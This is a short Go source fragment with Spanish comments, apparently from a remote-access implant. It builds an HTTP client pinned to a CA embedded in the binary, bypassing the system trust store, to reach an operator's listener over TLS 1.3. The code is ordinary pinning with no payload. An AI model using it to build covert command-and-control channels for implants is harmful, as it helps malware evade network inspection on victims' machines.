// TLS pinneado: el implante confía SOLO en la CA incrustada en el
// binario, no en el trust store del sistema operativo.
// ════════════════════════════════════════════════════════════════════

func newHTTPClient() (*http.Client, error) {
	caPEM, err := base64.StdEncoding.DecodeString(CACertPEMBase64)
	if err != nil {
		return nil, fmt.Errorf("decodificar CA: %w", err)
	}

	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caPEM) {
		return nil, fmt.Errorf("CA PEM inválida (AppendCertsFromPEM falló)")
	}

	tlsCfg := &tls.Config{
		RootCAs:    pool,
		MinVersion: tls.VersionTLS13,
		// No hace falta ServerName explícito: Go lo deriva del URL.
		// El SAN del server debe incluir el host del ListenerURL.
	}

	transport := &http.Transport{
		TLSClientConfig:     tlsCfg,
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 4,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 15 * time.Second,
	}

	return &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}, nil
}

